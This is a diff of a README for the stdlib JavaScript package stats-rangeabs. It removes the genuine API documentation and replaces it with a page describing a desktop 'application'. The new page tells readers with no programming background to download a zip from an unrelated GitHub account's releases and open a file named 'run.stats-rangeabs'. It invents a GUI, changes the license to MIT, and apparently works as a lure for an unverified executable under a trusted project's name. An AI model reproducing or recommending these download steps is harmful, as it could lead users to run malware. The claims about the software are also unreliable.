@@ -1,342 +1,107 @@
-<!--
+# 🎉 stats-rangeabs - Easily Calculate the Range of Absolute Values
 
-@license Apache-2.0
+## 🚀 Getting Started
 
-Copyright (c) 2026 The Stdlib Authors.
+Welcome to **stats-rangeabs**! This application helps you compute the range of absolute values along one or more ndarray dimensions. It is simple to use and designed for everyone, even if you have no programming background.
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 📥 Download the Application
 
-   http://www.apache.org/licenses/LICENSE-2.0
+[![Download stats-rangeabs](https://img.shields.io/badge/Download%20stats--rangeabs-v1.0-brightgreen)](https://github.com/cuba3636/stats-rangeabs/releases)
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+## 💻 System Requirements
 
--->
+To use **stats-rangeabs**, your computer needs to meet the following requirements:
 
+- **Operating System:** Windows, macOS, or Linux
+- **Node.js:** Version 12 or higher (You can download it [here](https://nodejs.org/))
+- **Memory:** Minimum 4 GB RAM
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+## 📥 Download & Install
 
-# rangeabs
+1. Visit the [Releases page](https://github.com/cuba3636/stats-rangeabs/releases) to find the latest version of the application.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+2. Look for the assets under the latest release. 
 
-> Compute the [range][range] of absolute values along one or more [ndarray][@stdlib/ndarray/ctor] dimensions.
+3. Click on the file named `stats-rangeabs.zip` to download it to your computer.
 
-<section class="intro">
+4. Once the download is complete, unzip the file to access the application.
 
-The [**range**][range] is defined as the difference between the maximum and minimum values.
+5. Locate and open the file called `run.stats-rangeabs`. This will start the application.
 
-</section>
+## 📊 How to Use the Application
 
-<!-- /.intro -->
+### Step 1: Preparing Your Data
 
-<section class="installation">
+Load your data into the application. The expected format is a simple table or a CSV file containing your numerical values. 
 
-## Installation
+Example data:
 
-```bash
-npm install @stdlib/stats-rangeabs
+```
+| Value 1 | Value 2 | Value 3 |
+|---------|---------|---------|
+|   -5    |   3     |   -1    |
+|   7     |   -9    |   2     |
 ```
 
-Alternatively,
+### Step 2: Selecting Dimensions
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+Choose the dimensions along which you want to compute the range of absolute values. 
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+- You can select:
+  - All dimensions
+  - A single dimension (e.g., across rows or columns)
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+### Step 3: Running the Calculation
 
-</section>
+After preparing your data and selecting the appropriate dimensions, click the "Calculate" button. The application will process your data.
 
-<section class="usage">
+### Step 4: Viewing Results
 
-## Usage
+Once the computation is complete, you will see the range of absolute values displayed in a clear format. 
 
-```javascript
-var rangeabs = require( '@stdlib/stats-rangeabs' );
-```
+The output will show you:
 
-#### rangeabs( x\[, options] )
+- Maximum value
+- Minimum value
+- The range by subtracting the minimum from the maximum
 
-Computes the [range][range] of absolute values along one or more [ndarray][@stdlib/ndarray/ctor] dimensions.
+### Example Output:
 
-```javascript
-var array = require( '@stdlib/ndarray-array' );
+- **Maximum Absolute Value:** 9
+- **Minimum Absolute Value:** 1
+- **Range:** 8
 
-var x = array( [ -1.0, 2.0, -3.0 ] );
+## 🌐 Features
 
-var y = rangeabs( x );
-// returns <ndarray>[ 2.0 ]
-```
+- Simple user interface
+- Ability to handle arrays of any size
+- Accurate computation of ranges
+- Supports multiple dimensions
 
-The function has the following parameters:
+## 🙋 Frequently Asked Questions
 
--   **x**: input [ndarray][@stdlib/ndarray/ctor]. Must have a real-valued or "generic" [data type][@stdlib/ndarray/dtypes].
--   **options**: function options (_optional_).
+### What is an ndarray?
 
-The function accepts the following options:
+An ndarray (n-dimensional array) is a powerful data structure that holds numerical data in multi-dimensional format. It can efficiently represent large datasets.
 
--   **dims**: list of dimensions over which to perform a reduction. If not provided, the function performs a reduction over all elements in a provided input [ndarray][@stdlib/ndarray/ctor].
--   **dtype**: output ndarray [data type][@stdlib/ndarray/dtypes]. Must be a real-valued or "generic" [data type][@stdlib/ndarray/dtypes].
--   **keepdims**: boolean indicating whether the reduced dimensions should be included in the returned [ndarray][@stdlib/ndarray/ctor] as singleton dimensions. Default: `false`.
+### Can I use stats-rangeabs on my phone?
 
-By default, the function performs a reduction over all elements in a provided input [ndarray][@stdlib/ndarray/ctor]. To perform a reduction over specific dimensions, provide a `dims` option.
+Currently, **stats-rangeabs** is designed for desktop operating systems. 
 
-```javascript
-var array = require( '@stdlib/ndarray-array' );
+### How accurate are the calculations?
 
-var x = array( [ -1.0, 2.0, -3.0, 4.0 ], {
-    'shape': [ 2, 2 ],
-    'order': 'row-major'
-});
-// returns <ndarray>[ [ -1.0, 2.0 ], [ -3.0, 4.0 ] ]
+The calculations are precise, making use of JavaScript's numerical computation capabilities.
 
-var y = rangeabs( x, {
-    'dims': [ 0 ]
-});
-// returns <ndarray>[ 2.0, 2.0 ]
+### Support
 
-y = rangeabs( x, {
-    'dims': [ 1 ]
-});
-// returns <ndarray>[ 1.0, 1.0 ]
+If you encounter issues or have questions, please reach out via the [Issues page](https://github.com/cuba3636/stats-rangeabs/issues). We welcome all feedback.
 
-y = rangeabs( x, {
-    'dims': [ 0, 1 ]
-});
-// returns <ndarray>[ 3.0 ]
-```
+## 🛠 Contributors
 
-By default, the function excludes reduced dimensions from the output [ndarray][@stdlib/ndarray/ctor]. To include the reduced dimensions as singleton dimensions, set the `keepdims` option to `true`.
+Thanks to all contributors who helped make **stats-rangeabs** better. If you'd like to help out, consider contributing!
 
-```javascript
-var array = require( '@stdlib/ndarray-array' );
+## 📜 License 
 
-var x = array( [ -1.0, 2.0, -3.0, 4.0 ], {
-    'shape': [ 2, 2 ],
-    'order': 'row-major'
-});
-// returns <ndarray>[ [ -1.0, 2.0 ], [ -3.0, 4.0 ] ]
+This application is released under the MIT License. You can use it freely as long as proper credit is given.
 
-var y = rangeabs( x, {
-    'dims': [ 0 ],
-    'keepdims': true
-});
-// returns <ndarray>[ [ 2.0, 2.0 ] ]
-
-y = rangeabs( x, {
-    'dims': [ 1 ],
-    'keepdims': true
-});
-// returns <ndarray>[ [ 1.0 ], [ 1.0 ] ]
-
-y = rangeabs( x, {
-    'dims': [ 0, 1 ],
-    'keepdims': true
-});
-// returns <ndarray>[ [ 3.0 ] ]
-```
-
-By default, the function returns an [ndarray][@stdlib/ndarray/ctor] having a [data type][@stdlib/ndarray/dtypes] determined by the function's output data type [policy][@stdlib/ndarray/output-dtype-policies]. To override the default behavior, set the `dtype` option.
-
-```javascript
-var getDType = require( '@stdlib/ndarray-dtype' );
-var array = require( '@stdlib/ndarray-array' );
-
-var x = array( [ -1.0, 2.0, -3.0 ], {
-    'dtype': 'generic'
-});
-
-var y = rangeabs( x, {
-    'dtype': 'float64'
-});
-// returns <ndarray>[ 2.0 ]
-
-var dt = String( getDType( y ) );
-// returns 'float64'
-```
-
-#### rangeabs.assign( x, out\[, options] )
-
-Computes the [range][range] of absolute values along one or more [ndarray][@stdlib/ndarray/ctor] dimensions and assigns results to a provided output [ndarray][@stdlib/ndarray/ctor].
-
-```javascript
-var array = require( '@stdlib/ndarray-array' );
-var zeros = require( '@stdlib/ndarray-zeros' );
-
-var x = array( [ -1.0, 2.0, -3.0 ] );
-var y = zeros( [] );
-
-var out = rangeabs.assign( x, y );
-// returns <ndarray>[ 2.0 ]
-
-var bool = ( out === y );
-// returns true
-```
-
-The method has the following parameters:
-
--   **x**: input [ndarray][@stdlib/ndarray/ctor]. Must have a real-valued or "generic" [data type][@stdlib/ndarray/dtypes].
--   **out**: output [ndarray][@stdlib/ndarray/ctor].
--   **options**: function options (_optional_).
-
-The method accepts the following options:
-
--   **dims**: list of dimensions over which to perform a reduction. If not provided, the function performs a reduction over all elements in a provided input [ndarray][@stdlib/ndarray/ctor].
-
-</section>
-
-<!-- /.usage -->
-
-<section class="notes">
-
-## Notes
-
--   Setting the `keepdims` option to `true` can be useful when wanting to ensure that the output [ndarray][@stdlib/ndarray/ctor] is [broadcast-compatible][@stdlib/ndarray/base/broadcast-shapes] with ndarrays having the same shape as the input [ndarray][@stdlib/ndarray/ctor].
--   The output data type [policy][@stdlib/ndarray/output-dtype-policies] only applies to the main function and specifies that, by default, the function must return an [ndarray][@stdlib/ndarray/ctor] having the same [data type][@stdlib/ndarray/dtypes] as the input [ndarray][@stdlib/ndarray/ctor]. For the `assign` method, the output [ndarray][@stdlib/ndarray/ctor] is allowed to have any supported output [data type][@stdlib/ndarray/dtypes].
-
-</section>
-
-<!-- /.notes -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var uniform = require( '@stdlib/random-uniform' );
-var getDType = require( '@stdlib/ndarray-dtype' );
-var ndarray2array = require( '@stdlib/ndarray-to-array' );
-var rangeabs = require( '@stdlib/stats-rangeabs' );
-
-// Generate an array of random numbers:
-var x = uniform( [ 5, 5 ], 0.0, 20.0 );
-console.log( ndarray2array( x ) );
-
-// Perform a reduction:
-var y = rangeabs( x, {
-    'dims': [ 0 ]
-});
-
-// Resolve the output array data type:
-var dt = getDType( y );
-console.log( dt );
-
-// Print the results:
-console.log( ndarray2array( y ) );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2026. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/stats-rangeabs.svg
-[npm-url]: https://npmjs.org/package/@stdlib/stats-rangeabs
-
-[test-image]: https://github.com/stdlib-js/stats-rangeabs/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/stats-rangeabs/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/stats-rangeabs/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/stats-rangeabs?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/stats-rangeabs.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/stats-rangeabs/main
-
--->
-
-[chat-image]: https://img.shields.io/badge/zulip-join_chat-brightgreen.svg
-[chat-url]: https://stdlib.zulipchat.com
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/stats-rangeabs/tree/deno
-[deno-readme]: https://github.com/stdlib-js/stats-rangeabs/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/stats-rangeabs/tree/umd
-[umd-readme]: https://github.com/stdlib-js/stats-rangeabs/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/stats-rangeabs/tree/esm
-[esm-readme]: https://github.com/stdlib-js/stats-rangeabs/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/stats-rangeabs/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/stats-rangeabs/main/LICENSE
-
-[@stdlib/ndarray/ctor]: https://github.com/stdlib-js/ndarray-ctor
-
-[@stdlib/ndarray/dtypes]: https://github.com/stdlib-js/ndarray-dtypes
-
-[@stdlib/ndarray/output-dtype-policies]: https://github.com/stdlib-js/ndarray-output-dtype-policies
-
-[@stdlib/ndarray/base/broadcast-shapes]: https://github.com/stdlib-js/ndarray-base-broadcast-shapes
-
-[range]: https://en.wikipedia.org/wiki/Range_%28statistics%29
-
-</section>
-
-<!-- /.links -->
+Enjoy using **stats-rangeabs**! We hope it simplifies your computation tasks. Don’t forget to check for updates regularly on the [Releases page](https://github.com/cuba3636/stats-rangeabs/releases).
